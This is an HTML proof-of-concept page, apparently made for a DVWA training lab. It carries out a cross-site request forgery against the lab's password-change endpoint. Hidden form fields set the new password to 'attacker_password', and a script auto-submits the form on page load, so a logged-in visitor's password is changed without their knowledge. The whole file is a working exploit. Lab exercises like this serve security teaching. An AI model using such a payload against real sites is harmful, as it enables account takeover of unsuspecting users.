<!DOCTYPE html>
<html lang="en-GB">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>CSRF Attack - Change Password</title>
</head>
<body>

    <h3>CSRF Attack - Change Password</h3>

    <!-- Crafting the form that submits the password change request -->
    <form action="https://lab-2105cf46-fd70-4e4b-8ece-4494323c5240.australiaeast.cloudapp.azure.com:7042/DVWA/vulnerabilities/csrf/source/low.php" method="GET">
        <!-- Pre-filled password fields -->
        <input type="hidden" name="password_new" value="attacker_password">
        <input type="hidden" name="password_conf" value="attacker_password">
        <input type="hidden" name="Change" value="Change">

        <!-- Automatically submit the form upon page load -->
        <script>
            document.forms[0].submit();
        </script>
    </form>

    <p>If you see this text, the CSRF attack has already been executed.</p>

</body>
</html>
